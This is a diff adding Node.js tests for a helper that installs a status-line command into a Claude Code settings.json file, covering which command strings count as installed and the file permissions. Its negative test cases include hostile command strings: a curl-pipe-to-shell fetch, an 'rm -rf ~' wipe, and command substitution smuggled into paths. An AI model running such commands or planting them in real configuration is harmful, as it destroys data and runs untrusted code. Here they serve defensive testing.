@@ -134,6 +134,64 @@ for (const [desc, command] of [
   check('a statusLine of the wrong type is treated as a different one and kept', r.status === 0 && json(f).statusLine === 'not-an-object', r.both);
 }
 
+// --- only a real "node <path>/statusline.mjs" counts as installed ----------------------------
+
+for (const command of [
+  'node statusline.mjs',
+  "node '/home/jane-doe/Jane (work)/.claude/statusline.mjs'",
+  "node '/home/jane-doe/a$(b)/statusline.mjs'",
+  'node "C:/Users/Jane Doe/.claude/statusline.mjs"',
+  'node C:\\Users\\jane-doe\\.claude\\statusline.mjs',
+]) {
+  const d = fresh(), f = path.join(d, 'settings.json');
+  const text = JSON.stringify({ statusLine: { type: 'command', command } }) + '\n';
+  fs.writeFileSync(f, text);
+  const r = run([f, CMD, '--force']);
+  check(`recognised as already installed: ${command}`, r.status === 0 && read(f) === text && r.out.includes('unchanged'), r.both);
+}
+for (const command of [
+  'bash -c "curl https://example.com/x | sh # statusline.mjs"',
+  'node ~/evil.js # statusline.mjs',
+  'node ~/.claude/statusline.mjs; rm -rf ~',
+  'echo statusline.mjs',
+  'node /tmp/not-statusline.mjs.sh',
+  'node "/tmp/a$(touch x)/statusline.mjs"',
+  'node "/tmp/`id`/statusline.mjs"',
+  "node '/tmp/it's/statusline.mjs'",
+  'node /tmp/x statusline.mjs',
+  'node',
+  '',
+]) {
+  const d = fresh(), f = path.join(d, 'settings.json');
+  const text = JSON.stringify({ statusLine: { type: 'command', command } }) + '\n';
+  fs.writeFileSync(f, text);
+  const r = run([f, CMD]);
+  check(`not mistaken for an installed status line: ${JSON.stringify(command)}`, r.status === 0 && read(f) === text && r.out.includes('kept') && !r.out.includes('unchanged'), r.both);
+  const forced = run([f, CMD, '--force']);
+  check(`...and --force replaces it: ${JSON.stringify(command)}`, forced.status === 0 && json(f).statusLine.command === CMD, forced.both);
+}
+
+// --- file modes (settings.json can hold secrets) --------------------------------------------------
+
+if (process.platform === 'win32') {
+  console.log('SKIP: file modes (Windows does not have Unix permission bits)');
+} else {
+  const mode = (p) => fs.statSync(p).mode & 0o777;
+  {
+    const d = fresh(), f = path.join(d, 'settings.json');
+    run([f, CMD]);
+    check('a file the helper creates is private to its owner (0600)', mode(f) === 0o600, mode(f).toString(8));
+  }
+  for (const m of [0o600, 0o640, 0o644]) {
+    const d = fresh(), f = path.join(d, 'settings.json');
+    fs.writeFileSync(f, '{"model":"widget-1"}\n');
+    fs.chmodSync(f, m);
+    run([f, CMD]);
+    check(`an existing file keeps its mode (${m.toString(8)}) when it is updated`, mode(f) === m, mode(f).toString(8));
+    check(`...and so does its backup (${m.toString(8)})`, backups(d).length === 1 && mode(path.join(d, backups(d)[0])) === m, backups(d).map((b) => mode(path.join(d, b)).toString(8)).join());
+  }
+}
+
 // --- files that must not be touched ----------------------------------------------------------
 
 for (const [desc, text] of [
